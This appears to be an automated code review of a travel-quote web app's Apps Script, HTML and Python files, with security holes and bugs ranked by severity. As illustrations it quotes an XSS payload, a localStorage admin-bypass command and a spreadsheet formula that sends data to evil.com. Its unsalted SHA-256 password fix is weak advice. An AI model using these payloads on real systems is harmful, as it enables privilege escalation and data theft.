# TripStore Code Review Report
**Date:** 2026-05-26
**Reviewed by:** Automated Daily Review
**Files reviewed:** Code.gs, Pipeline.gs, Quote_Intelligence.gs, index_fit.tripstore.html, write_to_sheets.py, archive_to_input.py

> **Note:** The following files listed for review were not found in this repository and could not be reviewed:
> `extract_itineraries.py`, `write_inputs_to_sheets.py`, `cleanup_sheet.py`, `clean_pipeline_data.py`, `cross_reference.py`, `enrich_hotels.py`, `enrich_hotels_booking.py`
> These may exist only on the local machine and should be committed or reviewed separately.

---

## CRITICAL Issues (5)

---

### [CRITICAL-1] Code.gs — Plaintext password storage and comparison

**File:** `Code.gs` — Lines 261, 289

Passwords are stored as plain text in the Google Sheets "Users" tab and compared as plain strings in `checkLogin()`. Anyone with edit access to the spreadsheet (including any future admin account) can read every user's password directly from the sheet.

```javascript
// Line 261 — plaintext comparison:
if (dbUser === user.trim().toLowerCase() && dbPass === pass.trim()) {

// Line 289 — plaintext write:
sheet.appendRow([username.trim(), password.trim(), 'PENDING', ...])
```

**Risk:** Full credential exposure to any Google Sheet viewer.
**Fix:** Hash passwords with a server-side function (e.g. `Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, password)`) before storing and comparing. This is a one-line change.

---

### [CRITICAL-2] Code.gs — No authentication on saveItinerary, searchItinerary, getQuoteLog, getAllSaved

**File:** `Code.gs` — Lines 29, 33, 300, 321, 372

`doGet` and `doPost` have zero authentication checks. Any person who discovers the public `/exec` URL can:
- Read all saved itineraries (`?action=search&name=...`)
- Read all pax names in the system (`?action=getAllSaved`)
- Read the full Quote_Log with financial data (`?action=getQuoteLog`)
- Save/overwrite any itinerary under any name (`action=saveItinerary` POST)

There is no session token, no user binding, and no authorisation check in any of these handlers.

**Risk:** Full data exposure and unauthorised data modification.
**Fix:** Add a `token` field to every request (generated after login, stored in Script Properties or Cache Service), validate it server-side before processing any data action.

---

### [CRITICAL-3] index_fit.tripstore.html — Admin bypass via localStorage manipulation

**File:** `index_fit.tripstore.html` — Lines 642-651

`checkAutoLogin()` restores admin status from `localStorage` on every page load without re-verifying with the server:

```javascript
function checkAutoLogin() {
    const saved = localStorage.getItem("tripstore_session");
    if (saved) {
        const s = JSON.parse(saved);
        isAdmin = s.isAdmin;   // purely client-side — no server check
        launchApp(s.modeText);
    }
}
```

Any user can open browser DevTools, run `localStorage.setItem("tripstore_session", JSON.stringify({isLoggedIn:true, isAdmin:true, modeText:"ADMIN MODE"}))`, and refresh the page to gain admin access — including visibility of the admin panel and the ability to load any user's saved itinerary.

**Risk:** Any logged-in user can elevate to admin without server verification.
**Fix:** The admin panel actions (loading other users' itineraries) must be authorised server-side. Add a persistent token tied to the role and validate on the Apps Script side.

---

### [CRITICAL-4] index_fit.tripstore.html — checkLogin sent as POST but Code.gs only handles it in doGet

**File:** `index_fit.tripstore.html` line 583 vs `Code.gs` lines 26, 48

Login is sent as a POST request from the frontend:
```javascript
const res = await fetch(API_URL, { method: "POST", body: JSON.stringify({ action: "checkLogin", user, pass }) });
```

But in `Code.gs`, `doPost()` only handles `"signup"` and `"saveItinerary"`. The `"checkLogin"` action only exists in `doGet()`. A POST with `action: "checkLogin"` falls through `doPost()` and returns `"Invalid action"`, which the frontend shows as "Invalid Credentials".

**Risk:** Login is broken for any user without an existing localStorage session. New users cannot log in.
**Fix:** Move the `checkLogin` handler into `doPost()` and read credentials from `e.postData.contents`. This is also more secure as it keeps credentials out of the URL.

---

### [CRITICAL-5] Pipeline.gs — Claude output written to master sheets without validation safeguard

**File:** `Pipeline.gs` — Lines 238-245

Enriched data returned by Claude is appended directly to the production master sheets (Hotels, Sightseeing, etc.) with no schema validation:

```javascript
const rowArr = Array.isArray(r) ? r : (r && typeof r === 'object' ? Object.values(r) : [String(r)]);
mst.appendRow(rowArr);
```

If Claude returns malformed data, extra columns, or a prompt injection payload in any cell (e.g. a formula like `=IMPORTXML(...)`), it will be written into the live master sheet that powers `fit.tripstoreholidays.com`. There is no backup step, no row count check, and no rollback capability.

**Risk:** Corrupted or malicious data appended directly to the live production database.
**Fix:** Validate `rowArr.length === expectedColumnCount` before appending. Strip any cell value that starts with `=`, `+`, `-`, `@`. Consider writing to a staging sheet first, then promoting manually.

---

## MODERATE Issues (12)

---

### [MODERATE-1] Code.gs — Credentials exposed in GET parameters (checkLogin doGet path)

**File:** `Code.gs` — Line 26

Even if routing were fixed to use GET, sending `user` and `pass` as URL query parameters means they appear in Google server logs, browser history, and referrer headers.

**Fix:** Route login via POST body (see CRITICAL-4 fix).

---

### [MODERATE-2] Code.gs — Formula injection risk in sheet writes

**File:** `Code.gs` — Line 289

User-supplied signup fields are written directly to the sheet with `appendRow()`. In Apps Script, `appendRow()` uses USER_ENTERED input by default. A value like `=IMPORTDATA("https://evil.com/?d=")` submitted as an agency name would execute as a spreadsheet formula.

**Fix:** Sanitise all user-supplied fields to strip leading `=`, `+`, `-`, `@` characters before writing, or use a Sheets API call with `valueInputOption: "RAW"`.

---

### [MODERATE-3] Code.gs — Transfer column 13 mislabelled as "Schedule" in comment

**File:** `Code.gs` — Line 202

```javascript
notes: String(r[13] || '').trim(), // Column N: Schedule
```

The comment says "Column N: Schedule" but `r[13]` (0-indexed) maps to the **Schedule** column (column 14 in the sheet), being stored as `notes` in the object. The actual Notes column `r[14]` is not included at all. Agents reading `transfer.notes` get the schedule text, not notes.

**Fix:** Rename the field to `schedule` and add `notes: String(r[14] || '').trim()` as a separate field.

---

### [MODERATE-4] Pipeline.gs — Batch result index mismatch causes silent row skip

**File:** `Pipeline.gs` — Lines 228-249

`results.forEach((res, idx)` maps by array position, not by `res.idx`. If Claude returns a shorter array than expected (truncated response, partial parse, wrong idx values), rows beyond the array length are silently skipped. They remain PENDING and are reprocessed forever without any error notification.

**Fix:** After parsing, remap results by `res.idx` explicitly, and mark any unmatched input rows as ERROR with reason "No response from Claude".

---

### [MODERATE-5] Pipeline.gs — `setupSheets()` inserts duplicate banner row on every re-run

**File:** `Pipeline.gs` — Lines 777-787

`_buildInputSheet()` unconditionally calls `ws.insertRowBefore(2)` every time, adding a new blank row 2 even if the info banner already exists. Running `setupSheets()` twice corrupts all input sheets by pushing data rows down, breaking alignment with HC/SC/TC/XC column constants.

**Fix:** Check if row 2 is already merged before inserting: only insert if `ws.getRange(2,1,1,headers.length).getMergedRanges().length === 0`.

---

### [MODERATE-6] Pipeline.gs — No retry on Claude API 429/529 errors

**File:** `Pipeline.gs` — Lines 564-597

If the Claude API returns rate-limit (429) or overloaded (529), the entire batch is immediately marked as ERROR. There is no retry. All rows need manual `resetErrorRows()` intervention before the next night's run.

**Fix:** Add a retry loop with `Utilities.sleep(3000 * attempt)` and up to 2 retries before marking as ERROR.

---

### [MODERATE-7] Pipeline.gs — 6-minute GAS timeout risk on large input batches

**File:** `Pipeline.gs` — Line 252

`Utilities.sleep(1500)` between every batch. With 200+ pending rows, pipeline runtime exceeds the 6-minute Google Apps Script execution limit, terminating mid-run with partially processed sheets and no cleanup.

**Fix:** Add elapsed-time guard: if runtime exceeds 5 minutes, stop gracefully, log remaining row count to AUDIT_LOG, and send a partial-run warning in the summary email.

---

### [MODERATE-8] Quote_Intelligence.gs — GST always logged as 5% regardless of agent selection

**File:** `Quote_Intelligence.gs` — Lines 118-121

```javascript
const gstPct = d.gst || 5;
```

The payload stores GST as `d.gstMode` (string: `'5pkg'`, `'18svc'`, `'none'`), not as a numeric `d.gst`. So `d.gst` is always `undefined` and `gstPct` always defaults to `5`. Quote_Log reports wrong GST amounts for every quote using 18% or 0%.

**Fix:**
```javascript
const gstPct = d.gstMode === '18svc' ? 18 : (d.gstMode === '5pkg' ? 5 : 0);
```

---

### [MODERATE-9] Quote_Intelligence.gs — Duplicate quote rows on every re-save

**File:** `Quote_Intelligence.gs` — Lines 29-47

`logQuote()` calls `logSheet.appendRow()` unconditionally on every save, including updates. An itinerary saved 10 times during preparation generates 10 quote rows for the same pax, corrupting totals and conversion rate analysis.

**Fix:** Scan Quote_Log for an existing row with matching paxName logged within the last hour. If found, update in place rather than appending.

---

### [MODERATE-10] write_to_sheets.py — `ws.row_count == 0` is always false (dead code)

**File:** `write_to_sheets.py` — Line 168

```python
sheet_is_empty = ws.row_count == 0 or not ws.get_all_values()
```

`ws.row_count` returns the sheet's total row capacity (default 1000), never 0. The `row_count == 0` clause is dead code that creates false confidence the empty check is thorough. The actual check relies solely on `not ws.get_all_values()`.

**Fix:** Remove `ws.row_count == 0 or` from the condition.

---

### [MODERATE-11] archive_to_input.py — Transfer city extraction fails on European airport names

**File:** `archive_to_input.py` — Lines 155-162

The city extractor uses a regex split on English airport keywords. Cities like `Lyon Saint-Exupéry`, `Nice Côte d'Azur`, `Prague Václav Havel`, and `Krakow John Paul II` won't split correctly, producing wrong or empty city names that get silently written to INPUT_Transfers.

**Fix:** Add common European city→IATA mappings as a fallback dictionary, or require city to be explicitly provided as a separate column in the archive CSV.

---

### [MODERATE-12] archive_to_input.py — Transfer rows have no Direction field set

**File:** `archive_to_input.py` — Lines 276-289

`make_transfer_row()` leaves `row[6]` (Direction: ARRIVAL/DEPARTURE) blank. The Claude enrichment prompt requires this field. With no direction hint, Claude must guess from location name strings, producing inconsistent results.

**Fix:** Heuristically infer direction: if `from_loc` contains airport/IATA keywords it's ARRIVAL; if `to_loc` does, it's DEPARTURE. Set `row[6]` before returning.

---

## MINOR Issues (9)

---

### [MINOR-1] Code.gs — Hard-coded column indices break silently if sheet columns shift

**File:** `Code.gs` — Lines 99, 136, 154, 185

All data reads use hard-coded 0-based array indices (e.g. `r[18]` for Annual Avg). If a column is inserted in any master sheet, all subsequent data reads return wrong values with no error.

**Fix:** Read headers once and build a name-to-index map dynamically at runtime.

---

### [MINOR-2] Pipeline.gs — Model name will break silently on model retirement

**File:** `Pipeline.gs` — Line 39

`MODEL: 'claude-haiku-4-5-20251001'` is hard-coded. When this model is retired, all pipeline runs will fail with a 404 from the Anthropic API until someone updates the code.

**Fix:** Store the model name in Script Properties alongside the API key so it can be updated without a code deployment.

---

### [MINOR-3] Quote_Intelligence.gs — Quote ID collision risk on rapid saves

**File:** `Quote_Intelligence.gs` — Line 140

`'Q-' + new Date().getTime().toString().slice(-8)` uses only the last 8 decimal digits of a millisecond timestamp. Two saves within the same millisecond produce identical Quote IDs.

**Fix:** Append a random 3-digit suffix: `'Q-' + Date.now().toString().slice(-8) + Math.floor(Math.random()*1000).toString().padStart(3,'0')`.

---

### [MINOR-4] Quote_Intelligence.gs — `_titleCase()` uses deprecated `substr()`

**File:** `Quote_Intelligence.gs` — Line 315

`String.prototype.substr()` is deprecated. Should be `substring(1)`.

---

### [MINOR-5] Quote_Intelligence.gs — `backfillQuoteLog()` has no idempotency guard

**File:** `Quote_Intelligence.gs` — Lines 278-309

Running `backfillQuoteLog()` twice imports all historical quotes twice with no duplicate check. Quote_Log row counts double on every re-run.

**Fix:** Before importing, build a set of existing paxName + date combinations and skip any row already present.

---

### [MINOR-6] index_fit.tripstore.html — Potential XSS in `renderRouteInputs()`

**File:** `index_fit.tripstore.html` — Line 841

City name is interpolated directly into `innerHTML`:
```javascript
`<span><b>${r.city}</b> (${r.nights}N)</span>`
```

A crafted city string like `</b><img src=x onerror=alert(1)>` would execute in-page. While cities are picked from a datalist, free-text entry is not blocked.

**Fix:** Use `document.createTextNode()` or escape HTML entities before interpolating user input into innerHTML.

---

### [MINOR-7] write_to_sheets.py + archive_to_input.py — Spreadsheet ID committed to version control

**Files:** `write_to_sheets.py` line 27, `archive_to_input.py` line 32

`SPREADSHEET_ID = "1U3f6PhTpvbEO7JG937t2z9EW9dfB0gcIOUVA_GATIHM"` is hardcoded in source. If this repository is ever public or forked, the ID is permanently in git history.

**Fix:** `SPREADSHEET_ID = os.environ.get("TRIPSTORE_SHEET_ID", "1U3f6PhTpvbEO7JG937t2z9EW9dfB0gcIOUVA_GATIHM")` — at minimum read from env with the current value as fallback.

---

### [MINOR-8] Pipeline.gs — `auditLog()` silently stops working if AUDIT_LOG sheet fills

**File:** `Pipeline.gs` — Lines 657-664

The `try/catch` in `auditLog()` swallows all errors silently. If the AUDIT_LOG sheet hits Google Sheets limits, auditing stops with no notification and no indication in the summary email.

**Fix:** Track audit failure in a Script Property and report it in the next pipeline summary email.

---

### [MINOR-9] archive_to_input.py — `parse_sightseeing_cell()` silently drops trailing entries

**File:** `archive_to_input.py` — Line 86

`range(0, len(parts) - 2, 3)` — if the total number of pipe-delimited parts is not a clean multiple of 3, the last 1 or 2 parts are silently dropped with no warning.

**Fix:** Change to `range(0, len(parts), 3)` and guard each field access: `if i + 1 < len(parts) and parts[i] and parts[i+1]`.

---

## Action Items (Priority Order)

| # | Severity | File | Action |
|---|----------|------|--------|
| 1 | CRITICAL | Code.gs | Hash passwords before storing and comparing |
| 2 | CRITICAL | Code.gs | Add server-side auth token to all data actions |
| 3 | CRITICAL | index_fit.tripstore.html | Re-verify admin role server-side on every sensitive request |
| 4 | CRITICAL | Code.gs + HTML | Fix checkLogin routing — move handler to doPost |
| 5 | CRITICAL | Pipeline.gs | Validate Claude output schema and strip formulas before appending to master sheets |
| 6 | MODERATE | Quote_Intelligence.gs | Fix GST rate derivation from gstMode string |
| 7 | MODERATE | Pipeline.gs | Add elapsed-time guard to prevent 6-minute GAS timeout |
| 8 | MODERATE | Pipeline.gs | Add retry with backoff for Claude API 429/529 errors |
| 9 | MODERATE | Pipeline.gs | Fix batch idx mapping to avoid silent row skips |
| 10 | MODERATE | Pipeline.gs | Guard setupSheets() against duplicate banner row insertion |
| 11 | MODERATE | Quote_Intelligence.gs | Deduplicate Quote_Log entries on re-save |
| 12 | MODERATE | Code.gs | Fix Transfer notes/schedule column mislabelling |
| 13 | MODERATE | archive_to_input.py | Fix city extraction for European airport names |
| 14 | MODERATE | archive_to_input.py | Set Direction field (ARRIVAL/DEPARTURE) in transfer rows |
| 15 | MINOR | All .py files | Move SPREADSHEET_ID to environment variable |
| 16 | MINOR | Pipeline.gs | Move Claude model name to Script Properties |
| 17 | MINOR | index_fit.tripstore.html | Escape HTML in renderRouteInputs() |
| 18 | MINOR | Quote_Intelligence.gs | Fix deprecated substr() → substring() |

---

*Report generated: 2026-05-26 | Total: 26 issues — 5 Critical, 12 Moderate, 9 Minor*
